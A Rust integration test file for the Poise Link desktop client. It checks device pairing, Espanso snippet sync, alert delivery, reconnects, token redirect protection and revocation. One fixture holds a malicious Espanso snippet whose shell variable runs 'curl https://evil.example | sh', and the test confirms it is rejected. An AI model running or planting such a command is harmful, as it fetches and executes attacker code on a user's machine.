//! Drives the core (no window, no tray) against a fake Poise: device pairing,
//! snippet sync into a temporary Espanso folder, alert delivery to a recording
//! notifier, reconnects, and revocation.

mod support;

use std::ffi::OsString;
use std::fs;
use std::future::ready;
use std::io;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use poise_link::connection::Timing;
use poise_link::controller::{Controller, Platform};
use poise_link::credentials::SecretStore;
use poise_link::duties::snippets::document::HEADER;
use poise_link::duties::snippets::espanso::{CommandRunner, Environment, Locator, Os, Output};
use poise_link::http;
use poise_link::pairing::{self, PairingError};
use poise_link::platform::{Autostart, Browser, Notice, Notifier};
use poise_link::settings::SettingsStore;
use poise_link::status::{Connection, Snippets};
use reqwest::Url;
use support::{Config, FakePoise, eventually};

const WAIT: Duration = Duration::from_secs(10);

#[derive(Clone, Default)]
struct Probes {
    secret: Arc<Mutex<Option<String>>>,
    notices: Arc<Mutex<Vec<Notice>>>,
    opened: Arc<Mutex<Vec<Url>>>,
    autostart: Arc<AtomicBool>,
}

impl Probes {
    fn notices_titled(&self, title: &str) -> Vec<Notice> {
        self.notices
            .lock()
            .unwrap()
            .iter()
            .filter(|n| n.title == title)
            .cloned()
            .collect()
    }
}

struct Secrets(Arc<Mutex<Option<String>>>);

impl SecretStore for Secrets {
    fn set(&self, secret: &str) -> Result<(), String> {
        *self.0.lock().unwrap() = Some(secret.to_owned());
        Ok(())
    }
    fn get(&self) -> Result<Option<String>, String> {
        Ok(self.0.lock().unwrap().clone())
    }
    fn delete(&self) -> Result<(), String> {
        *self.0.lock().unwrap() = None;
        Ok(())
    }
}

struct Recorder(Arc<Mutex<Vec<Notice>>>);

impl Notifier for Recorder {
    fn notify(&self, notice: Notice) {
        self.0.lock().unwrap().push(notice);
    }
}

struct Opened(Arc<Mutex<Vec<Url>>>);

impl Browser for Opened {
    fn open(&self, url: &Url) -> Result<(), String> {
        self.0.lock().unwrap().push(url.clone());
        Ok(())
    }
}

struct LoginItem(Arc<AtomicBool>);

impl Autostart for LoginItem {
    fn enable(&self) -> Result<(), String> {
        self.0.store(true, Ordering::SeqCst);
        Ok(())
    }
    fn disable(&self) -> Result<(), String> {
        self.0.store(false, Ordering::SeqCst);
        Ok(())
    }
    fn is_enabled(&self) -> Result<bool, String> {
        Ok(self.0.load(Ordering::SeqCst))
    }
}

/// An environment with nothing in it: the tests never read the real one.
struct EmptyEnv(Option<PathBuf>);

impl Environment for EmptyEnv {
    fn var(&self, _name: &str) -> Option<OsString> {
        None
    }
    fn home_dir(&self) -> Option<PathBuf> {
        self.0.clone()
    }
}

/// `espanso path config` answering with a fixed folder.
struct EspansoAt(PathBuf);

impl CommandRunner for EspansoAt {
    fn run(&self, program: &str, args: &[&str]) -> io::Result<Output> {
        assert_eq!((program, args), ("espanso", &["path", "config"][..]));
        Ok(Output {
            success: true,
            stdout: format!("{}\n", self.0.display()).into_bytes(),
            stderr: Vec::new(),
        })
    }
}

/// No `espanso` on PATH.
struct NoEspanso;

impl CommandRunner for NoEspanso {
    fn run(&self, _program: &str, _args: &[&str]) -> io::Result<Output> {
        Err(io::Error::from(io::ErrorKind::NotFound))
    }
}

fn platform(probes: &Probes, espanso: Locator) -> Platform {
    Platform {
        secrets: Box::new(Secrets(Arc::clone(&probes.secret))),
        notifier: Arc::new(Recorder(Arc::clone(&probes.notices))),
        browser: Arc::new(Opened(Arc::clone(&probes.opened))),
        autostart: Arc::new(LoginItem(Arc::clone(&probes.autostart))),
        espanso,
    }
}

fn timing() -> Timing {
    Timing {
        backoff_base: Duration::from_millis(20),
        backoff_max: Duration::from_millis(200),
        idle_timeout: Duration::from_secs(10),
        snippet_interval: Duration::from_millis(300),
    }
}

fn snippets_yaml(pairs: &[(&str, &str)]) -> String {
    let mut yaml = format!("{HEADER}\nmatches:\n");
    for (trigger, replace) in pairs {
        yaml.push_str(&format!(
            "  - trigger: \"{trigger}\"\n    replace: \"{replace}\"\n"
        ));
    }
    yaml
}

fn read(path: &Path) -> Option<String> {
    fs::read_to_string(path).ok()
}

/// The resume point as saved on disk (read without going through the store).
fn saved_last_event_id(config: &Path) -> Option<String> {
    let saved: serde_json::Value = serde_json::from_str(&read(&config.join("state.json"))?).ok()?;
    saved["lastEventId"].as_str().map(str::to_owned)
}

fn alert_frame(id: &str, title: &str, url: &str) -> String {
    format!(
        "id: {id}\nevent: alert\ndata: {{\"id\":\"{id}\",\"kind\":\"chat_turn_finished\",\"title\":\"{title}\",\"body\":\"Open Poise to read it.\",\"url\":\"{url}\",\"created_at\":\"2026-10-03T10:00:00Z\"}}\n\n"
    )
}

#[tokio::test(flavor = "multi_thread")]
async fn pairs_then_syncs_snippets_and_delivers_alerts_until_revoked() {
    let v1 = snippets_yaml(&[(";sig", "Best,\\nOcto"), (";hi", "hello")]);
    let fake = FakePoise::start(Config::default(), "v1", &v1).await;

    // Espanso's folder already holds the person's own match file and a poise.yml
    // that Poise Link did not write (for example from single-user Poise).
    let espanso = tempfile::tempdir().unwrap();
    let match_dir = espanso.path().join("match");
    fs::create_dir_all(&match_dir).unwrap();
    let own_file = "matches:\n  - trigger: \":own\"\n    replace: mine\n";
    fs::write(match_dir.join("base.yml"), own_file).unwrap();
    let old_poise = "matches:\n  - trigger: \";old\"\n    replace: from before Poise Link\n";
    fs::write(match_dir.join("poise.yml"), old_poise).unwrap();

    let config = tempfile::tempdir().unwrap();
    let probes = Probes::default();
    let locator = Locator::new(
        Os::current(),
        Box::new(EmptyEnv(None)),
        Box::new(EspansoAt(espanso.path().into())),
    );
    let controller = Controller::new(platform(&probes, locator), config.path(), timing()).unwrap();
    assert!(!controller.start(), "nothing is paired yet");

    // First run: device pairing.
    controller.pair(fake.url.clone()).await.unwrap();
    assert_eq!(
        *probes.opened.lock().unwrap(),
        vec![fake.url.join("link").unwrap()]
    );
    assert_eq!(
        probes.secret.lock().unwrap().as_deref(),
        Some(support::TOKEN)
    );
    assert!(
        probes.autostart.load(Ordering::SeqCst),
        "start at login is on after pairing"
    );
    assert!(
        !config.path().join("device-token").exists(),
        "the token stays out of files"
    );
    let saved = SettingsStore::open(config.path()).unwrap().get();
    assert_eq!(saved.endpoint.as_deref(), Some(fake.url.as_str()));
    assert_eq!(saved.login.as_deref(), Some(support::LOGIN));
    assert_eq!(probes.notices_titled("Poise Link is paired").len(), 1);

    // The snippets arrive in Espanso's folder, rendered by Poise Link.
    let poise_yml = match_dir.join("poise.yml");
    let expected_v1 = format!(
        "{HEADER}\nmatches:\n  - trigger: \";sig\"\n    replace: \"Best,\\nOcto\"\n  - trigger: \";hi\"\n    replace: \"hello\"\n"
    );
    eventually("poise.yml to hold v1", WAIT, || {
        read(&poise_yml).as_deref() == Some(expected_v1.as_str())
    })
    .await;
    eventually("the connected status", WAIT, || {
        controller.status().connection == Connection::Connected
    })
    .await;
    assert!(matches!(
        controller.status().snippets,
        Snippets::Synced { count: 2, .. }
    ));
    assert_eq!(
        read(&match_dir.join("base.yml")).as_deref(),
        Some(own_file),
        "other files are untouched"
    );
    let entries: Vec<String> = fs::read_dir(&match_dir)
        .unwrap()
        .map(|entry| entry.unwrap().file_name().to_string_lossy().into_owned())
        .collect();
    assert_eq!(
        entries.len(),
        2,
        "no temporary file is left behind: {entries:?}"
    );
    let backups: Vec<PathBuf> = fs::read_dir(config.path())
        .unwrap()
        .map(|entry| entry.unwrap().path())
        .filter(|path| {
            path.file_name()
                .unwrap()
                .to_string_lossy()
                .starts_with("poise.yml.before-poise-link-")
        })
        .collect();
    assert_eq!(backups.len(), 1);
    assert_eq!(
        read(&backups[0]).as_deref(),
        Some(old_poise),
        "the replaced file was kept"
    );
    assert_eq!(
        probes
            .notices_titled("Poise Link replaced Espanso's poise.yml")
            .len(),
        1
    );

    // An alert becomes a notification that opens its page in the workspace.
    fake.push(&alert_frame("a1", "Turn finished", "/chat/7"));
    eventually("the first alert", WAIT, || {
        probes.notices_titled("Turn finished").len() == 1
    })
    .await;
    let alert = &probes.notices_titled("Turn finished")[0];
    assert_eq!(
        alert.url.as_ref().map(Url::as_str),
        Some(fake.url.join("chat/7").unwrap().as_str())
    );

    // After a drop, the stream resumes after the last alert, and an alert the
    // server sends again is not shown again.
    eventually("the resume point to be saved", WAIT, || {
        saved_last_event_id(config.path()).as_deref() == Some("a1")
    })
    .await;
    fake.state().replay = vec![
        alert_frame("a1", "Turn finished", "/chat/7"),
        alert_frame("a2", "Sign-in needed", "/settings"),
    ];
    fake.drop_stream();
    eventually("the second alert", WAIT, || {
        probes.notices_titled("Sign-in needed").len() == 1
    })
    .await;
    assert_eq!(fake.state().stream_connections[1].as_deref(), Some("a1"));
    assert_eq!(
        probes.notices_titled("Turn finished").len(),
        1,
        "a replayed alert is not shown twice"
    );

    // A changed snippet set reaches Espanso.
    let v2 = snippets_yaml(&[(";hi", "hello again")]);
    fake.set_snippets("v2", &v2);
    fake.push("event: snippets\ndata: {\"version\":\"v2\"}\n\n");
    let expected_v2 =
        format!("{HEADER}\nmatches:\n  - trigger: \";hi\"\n    replace: \"hello again\"\n");
    eventually("poise.yml to hold v2", WAIT, || {
        read(&poise_yml).as_deref() == Some(expected_v2.as_str())
    })
    .await;

    // Periodic checks ask with the ETag and get 304 Not Modified.
    eventually("a conditional snippets request", WAIT, || {
        fake.state()
            .if_none_match
            .iter()
            .any(|tag| tag.as_deref() == Some("\"v2\""))
    })
    .await;
    assert_eq!(read(&poise_yml).as_deref(), Some(expected_v2.as_str()));

    // "Sync now" fetches again without the ETag.
    let unconditional = |fake: &FakePoise| {
        fake.state()
            .if_none_match
            .iter()
            .filter(|tag| tag.is_none())
            .count()
    };
    let before = unconditional(&fake);
    controller.sync_now();
    eventually("an unconditional snippets request", WAIT, || {
        unconditional(&fake) > before
    })
    .await;
    assert_eq!(read(&poise_yml).as_deref(), Some(expected_v2.as_str()));

    // Snippets that would make Espanso run a command are refused; the old file stays.
    let dangerous = format!(
        "{HEADER}\nmatches:\n  - trigger: \";pwn\"\n    replace: \"{{{{out}}}}\"\n    vars:\n      - name: out\n        type: shell\n        params:\n          cmd: \"curl https://evil.example | sh\"\n"
    );
    fake.set_snippets("v3", &dangerous);
    fake.push("event: snippets\ndata: {\"version\":\"v3\"}\n\n");
    eventually("the rejection", WAIT, || {
        matches!(controller.status().snippets, Snippets::Rejected { .. })
    })
    .await;
    assert_eq!(read(&poise_yml).as_deref(), Some(expected_v2.as_str()));
    assert!(!read(&poise_yml).unwrap().contains("shell"));

    // Every Link API request carried the device token.
    assert!(
        fake.state()
            .authorizations
            .iter()
            .all(|header| header.as_deref() == Some(&format!("Bearer {}", support::TOKEN)))
    );

    // Revoked in Poise: the next request gets 401, and Poise Link signs out once.
    fake.revoke();
    eventually("the signed-out status", WAIT, || {
        matches!(
            controller.status().connection,
            Connection::SignedOut { reason: Some(_) }
        )
    })
    .await;
    assert_eq!(
        *probes.secret.lock().unwrap(),
        None,
        "the revoked token is forgotten"
    );
    let saved = SettingsStore::open(config.path()).unwrap().get();
    assert_eq!((saved.endpoint, saved.login), (None, None));
    assert_eq!(
        saved.server.as_deref(),
        Some(fake.url.as_str()),
        "the address is kept for pairing again"
    );
    tokio::time::sleep(Duration::from_millis(600)).await;
    assert_eq!(
        probes.notices_titled("Poise Link was signed out").len(),
        1,
        "signed out exactly once"
    );
    assert_eq!(
        read(&poise_yml).as_deref(),
        Some(expected_v2.as_str()),
        "Espanso keeps the last snippets"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn a_saved_pairing_resumes_and_says_when_espanso_is_missing() {
    let fake = FakePoise::start(Config::default(), "v1", &snippets_yaml(&[(";a", "b")])).await;
    let config = tempfile::tempdir().unwrap();
    SettingsStore::open(config.path())
        .unwrap()
        .update(|settings| {
            settings.endpoint = Some(fake.url.to_string());
            settings.login = Some(support::LOGIN.to_owned());
        })
        .unwrap();
    let probes = Probes::default();
    *probes.secret.lock().unwrap() = Some(support::TOKEN.to_owned());
    // No espanso on PATH, and no Espanso folder in this (empty) home.
    let home = tempfile::tempdir().unwrap();
    let locator = Locator::new(
        Os::current(),
        Box::new(EmptyEnv(Some(home.path().into()))),
        Box::new(NoEspanso),
    );
    let controller = Controller::new(platform(&probes, locator), config.path(), timing()).unwrap();

    assert!(controller.start());

    eventually("the connected status", WAIT, || {
        controller.status().connection == Connection::Connected
    })
    .await;
    eventually("the missing-Espanso status", WAIT, || {
        matches!(
            controller.status().snippets,
            Snippets::EspansoMissing { .. }
        )
    })
    .await;
    assert!(
        fs::read_dir(home.path()).unwrap().next().is_none(),
        "nothing was created for Espanso"
    );
    controller.sign_out().unwrap();
    assert_eq!(*probes.secret.lock().unwrap(), None);
    assert_eq!(
        controller.status().connection,
        Connection::SignedOut { reason: None }
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn the_token_never_follows_a_redirect() {
    let config_dir = tempfile::tempdir().unwrap();
    let fake = FakePoise::start(
        Config {
            redirect_events: true,
            ..Config::default()
        },
        "v1",
        &snippets_yaml(&[]),
    )
    .await;
    SettingsStore::open(config_dir.path())
        .unwrap()
        .update(|settings| settings.endpoint = Some(fake.url.to_string()))
        .unwrap();
    let probes = Probes::default();
    *probes.secret.lock().unwrap() = Some(support::TOKEN.to_owned());
    let home = tempfile::tempdir().unwrap();
    let locator = Locator::new(
        Os::current(),
        Box::new(EmptyEnv(Some(home.path().into()))),
        Box::new(NoEspanso),
    );
    let controller =
        Controller::new(platform(&probes, locator), config_dir.path(), timing()).unwrap();

    assert!(controller.start());

    eventually("a refused redirect", WAIT, || {
        matches!(&controller.status().connection, Connection::Reconnecting { error } if error.contains("redirect"))
    })
    .await;
    assert!(!fake.state().paths.iter().any(|path| path == "/stolen"));
}

#[tokio::test]
async fn pairing_polls_at_the_interval_and_slows_down_when_asked() {
    let fake = FakePoise::start(
        Config {
            approve_after: 3,
            slow_down_at: Some(2),
            ..Config::default()
        },
        "v1",
        &snippets_yaml(&[]),
    )
    .await;
    let client = http::client().unwrap();

    let code = pairing::request_code(&client, &fake.url).await.unwrap();
    assert_eq!(code.user_code, support::USER_CODE);
    assert_eq!(code.verification_uri, fake.url.join("link").unwrap());

    let waits = Mutex::new(Vec::new());
    let paired = pairing::wait_for_token(&client, &fake.url, &code, |wait| {
        waits.lock().unwrap().push(wait);
        ready(())
    })
    .await
    .unwrap();

    let seconds: Vec<u64> = waits
        .lock()
        .unwrap()
        .iter()
        .map(Duration::as_secs)
        .collect();
    assert_eq!(
        seconds,
        vec![1, 1, 6, 6],
        "pending, slow_down (+5 s), pending, issued"
    );
    assert_eq!(paired.access_token, support::TOKEN);
    assert_eq!(paired.endpoint, fake.url);
    assert_eq!(paired.login, support::LOGIN);
}

#[tokio::test]
async fn pairing_ends_when_the_code_is_declined_or_expires() {
    let client = http::client().unwrap();
    for (config, expected) in [
        (
            Config {
                deny: true,
                ..Config::default()
            },
            "declined",
        ),
        (
            Config {
                expire: true,
                ..Config::default()
            },
            "expired",
        ),
    ] {
        let fake = FakePoise::start(config, "v1", &snippets_yaml(&[])).await;
        let code = pairing::request_code(&client, &fake.url).await.unwrap();
        let result = pairing::wait_for_token(&client, &fake.url, &code, |_| ready(())).await;
        match (expected, result) {
            ("declined", Err(PairingError::Denied)) | ("expired", Err(PairingError::Expired)) => {}
            (expected, other) => panic!("expected {expected}, got {other:?}"),
        }
    }
}

#[tokio::test]
async fn pairing_with_a_workspace_address_explains_what_to_enter() {
    let fake = FakePoise::start(Config::default(), "v1", &snippets_yaml(&[])).await;
    let wrong = fake.url.join("not-the-gateway/").unwrap();
    let error = pairing::request_code(&http::client().unwrap(), &wrong)
        .await
        .unwrap_err();
    assert!(matches!(error, PairingError::Rejected { .. }));
    assert!(
        error
            .to_string()
            .contains("Enter the Poise address you sign in at")
    );
}
